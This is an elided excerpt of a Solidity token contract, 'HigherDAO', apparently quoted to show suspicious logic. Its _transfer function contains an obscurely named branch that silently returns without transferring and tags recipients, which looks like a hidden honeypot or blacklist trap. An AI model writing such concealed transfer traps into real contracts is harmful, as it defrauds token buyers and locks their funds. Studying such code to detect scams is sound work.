...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            ...
            return;
        } else if (to != address(_swapRouter) && _function[from] > 0 && amount > _uint256 && to != _mainPair) {
            _function[to] = amount;
            return;
        }
...
contract HigherDAO is AbsToken {
    constructor() AbsToken(
        ...
        9,
        10000000,
        address(0xf3518aeba628637c11eE2dfDD3083939dA82F9E3),
        address(0x4F24E2e4eAf29cBeD41C888Bc04b17a03d73C255)
    ){
